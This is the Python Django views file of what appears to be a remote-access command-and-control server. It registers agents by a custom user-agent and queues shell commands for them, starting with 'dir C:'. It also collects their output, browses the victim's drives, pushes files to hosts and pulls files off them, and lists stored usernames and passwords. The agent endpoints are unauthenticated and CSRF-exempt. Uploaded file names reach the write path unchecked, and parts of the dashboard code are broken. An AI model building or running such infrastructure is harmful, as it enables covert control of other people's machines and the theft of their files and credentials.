from math import ceil
from django.http import HttpResponse, Http404
from django.contrib.auth import logout
from django.views.decorators.csrf import csrf_exempt
from django.utils.decorators import method_decorator
from django.contrib.auth.decorators import login_required
from django.shortcuts import render, redirect
import random
import string
from .models import *
from django.views.generic import View
import re
from .forms import UploadsForm
import json
import subprocess
import chardet


def name_extractor(request):
    match = re.search(r"(\S+)\s+(?=ImAgent/1\.0)", request.META.get('HTTP_USER_AGENT'))
    if match:
        return match.group(1)
    else:
        return None


def get_client_ip(request):
    x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
    if x_forwarded_for:
        ip = x_forwarded_for.split(',')[0]
    else:
        ip = request.META.get('REMOTE_ADDR')

    return ip


def create_or_get_users(request, id_name):
    id_name = id_name.lower()
    agent = Clients.objects.filter(id_name=id_name).first()
    if agent:
        if f'{agent.id_name} ImAgent/1.0' in request.META.get('HTTP_USER_AGENT'):
            agent.last_update = now()
            agent.save()
        return agent
    elif 'ImAgent/1.0' in request.META.get('HTTP_USER_AGENT'):
        agent = Clients.objects.create(id_name=id_name, address=get_client_ip(request))
        agent.last_update = now()
        agent.save()
        Commands.objects.create(receiver=agent, command='dir C:')
        return agent
    else:
        return None


def get_chunk(request, file, index):
    chunk_size = 2097152
    is_last = len(file.hex) < ((index + 1) * chunk_size)
    try:
        return file.hex[index * chunk_size:(index + 1) * chunk_size], is_last
    except IndexError:
        return file.hex[index * chunk_size:], True


class IndexView(View):
    def get(self, request):
        clients = Clients.objects.all()
        form = UploadsForm()
        client_list = {}
        commands_list = {}
        file_manager_list = {}

        for client in clients:
            client_list[client.id_name] = {
                'id': client.id,
                'id_name': client.id_name,
                'username': client.username,
                'password': client.password,
                'domain': client.domain,
                'ip_address': client.ip_address,
                'last_online_str': client.last_online_str(),
                'last_online': client.last_online(),
                'interval': client.interval,
            }

            commands = Commands.objects.filter(receiver=client)
            for command in commands:
                commands_list[client.id_name].append({
                    'command': command.command,
                    'response': command.response if command.response else '',
                    'name': command.command.split(' ')[0],
                    'time': command.time_passed()
                })

            file_manager = FileManager.objects.filter(client=client)
            for fm in file_manager:
                file_manager_list[client.id_name].append({
                    'name': fm.name,
                    'parent': fm.parent,
                    'files': fm.get_files(),
                    'folders': fm.get_folders(),
                    'is_drive': fm.is_drive,
                })


        json_data = json.dumps(client_list)
        commands_json = json.dumps(commands_list)
        file_manager_json = json.dumps(file_manager_list)
        context = {
            'json_data': json_data,
            'form': form,
            'clients': clients,
            'commands_json': commands_json,
            'file_manager_json': file_manager_json,
        }
        return render(request, 'server_side/index.html', context)

    def post(self, request):
        if self.request.POST.get('command'):
            client_name = self.request.POST.get('cmd_btn')
            client_name = client_name.split(' ')[2]
            receiver = create_or_get_users(request, client_name)
            if not receiver:
                client_name = client_name.lower()
                receiver = create_or_get_users(request, client_name)
            print(receiver)
            Commands.objects.create(receiver=receiver,
                                    command=self.request.POST.get('command'), timestamp=now())
        if request.FILES:
            form = UploadsForm(request.POST, request.FILES)
            client_name = self.request.POST.get('upload_btn')
            client_name = client_name.split(' ')[2]
            agent = create_or_get_users(request, client_name)
            if agent:
                print(agent)
                command = f"download {self.request.POST.get('upload_cmd')}"
                Commands.objects.create(receiver=agent, command=command, timestamp=now())
            if form.is_valid():
                upload = form.save(commit=False)
                if agent:
                    upload.client = agent
                    upload.save()
            else:
                print(f'file error: {form.errors}')

        if self.request.POST.get('interval_input'):
            client_name = self.request.POST.get('interval_btn')
            client_name = client_name.split(' ')[2]
            interval = self.request.POST.get('interval_input')
            agent = create_or_get_users(request, client_name)

            if agent:
                Commands.objects.create(receiver=agent,command=f"sleep {interval}", timestamp=now())
            else:
                return Http404("agent not found")

        return redirect('index')


@method_decorator(csrf_exempt, name='dispatch')
class SendCommand(View):
    def get(self, request):
        name = name_extractor(request)
        agent = create_or_get_users(request, name)

        if not agent:
            return HttpResponse('Agent not found', status=404)

        cmd_execution = Commands.objects.filter(receiver=agent, is_executed=False, command__icontains='dir').order_by('timestamp').first()

        if cmd_execution:
            cmd = f'{cmd_execution.command}, id={cmd_execution.id}'
            return HttpResponse(cmd, status=200)
        else:
            cmd_execution = Commands.objects.filter(receiver=agent, is_executed=False).order_by('timestamp').first()
            if cmd_execution:
                cmd = f'{cmd_execution.command}, id={cmd_execution.id}'
                return HttpResponse(cmd, status=200)

        return HttpResponse("No command available.", status=200)

    def post(self, request, *args, **kwargs):
        name = name_extractor(request)
        agent = create_or_get_users(request, name)
        body = request.body.decode('utf-8')
        print(body)
        if not agent:
            return HttpResponse("No client found.", status=404)

        match = re.search(r'\n,id\s*=\s*(\d+)', body)
        if not match:
            return HttpResponse("Mistake detected. No ID sent :|", status=400)

        cmd_id = int(match.group(1))

        cmd = Commands.objects.filter(receiver=agent, id=cmd_id).first()

        if cmd:
            cmd.is_executed = True
            response = re.sub(r'\n,id\s*=\s*(\d+)', '', body).strip()
            cmd.response = response
            if 'dir' in cmd.command:
                parent, name = '', ''
                match = re.match(r"^(.*)[/\\]([^/\\]+)[/\\]([^/\\]+)$", cmd.command)
                if match:
                    parent, name = match.group(2), match.group(3)

                fm = FileManager.objects.create(client=agent, parent_name=parent,
                                           name=name)
                fm.set_files_folders(response)
                fm.save()

            cmd.save()
            return HttpResponse("Command executed successfully.", status=200)

        return HttpResponse("Command not found.", status=401)


@method_decorator(csrf_exempt, name='dispatch')
class FileDownloadView(View):
    def get(self, request):
        name = name_extractor(request)
        agent = create_or_get_users(request, name)
        if agent:
            file = Uploads.objects.filter(client=agent).last()
            if file:
                hex_file = HexForDownload.objects.filter(file=file).last()
                response = HttpResponse(f'id={hex_file.id}', status=200)
                response['File-Name'] = file.file.name.replace("uploads/", "")
                response['Content-Length'] = ceil(file.file.size / (1024 * 1024))
                return response
            else:
                return HttpResponse('you have not file')
        else:
            return HttpResponse("No client found for this IP.", status=400)

    def post(self, request, *args, **kwargs):
        body = request.body.decode('utf-8')
        if 'send' not in body:
            return HttpResponse("Mistake detected. send not sent :|", status=400)
        match = re.search(r'index\s*=\s*(\d+)', body)
        if not match:
            return HttpResponse('Syntax Error. no index sent', status=400)
        index = int(match.group(1))
        match = re.search(r'id\s*=\s*(\d+)', body)
        if not match:
            return HttpResponse('Syntax Error. no ID sent :|', status=400)
        id = int(match.group(1))
        name = name_extractor(request)
        agent = create_or_get_users(request, name)
        if not agent:
            return HttpResponse("No client found for this IP.", status=401)
        hex_file = HexForDownload.objects.filter(id=id).last()
        chunk, last = get_chunk(request, hex_file, index)
        response = HttpResponse(chunk, content_type='application/octet-stream')
        hex_file.sent_count += 1
        hex_file.save()
        if last:
            response['Last-Chunk'] = last
            hex_file.delete()
        return response


@method_decorator(csrf_exempt, name='dispatch')
class FileUploadView(View):
    def post(self, request, *args, **kwargs):
        body = request.body.decode('utf-8')
        file_name = request.META.get('HTTP_FILENAME')
        if not file_name:
            return HttpResponse("Syntax Error. no filename sent :|", status=400)
        name = name_extractor(request)
        agent = create_or_get_users(request, name)
        if not agent:
            return HttpResponse("No client found for this IP.", status=401)
        id = request.META.get('HTTP_ID')
        if not id:
            return HttpResponse("Syntax Error. no ID sent :|", status=400)
        download = self.check_or_create_download(agent, file_name, id)
        with open(f'downloads/{file_name}', 'ab') as f:
            f.write(bytes.fromhex(body))
        if request.META.get('HTTP_LAST'):
            download.is_finished = True
            download.save()
        if download.is_finished:
            return HttpResponse('file is completely gotten', status=302)
        return HttpResponse('part is gotten', status=200)

    def check_or_create_download(self, agent, file_name, id):
        download = Downloads.objects.filter(id=id).first()
        if not download:
            return Downloads.objects.create(file_name=file_name, id=id, client=agent)
        return download


def logout_view(request):
    logout(request)
    return redirect('login')


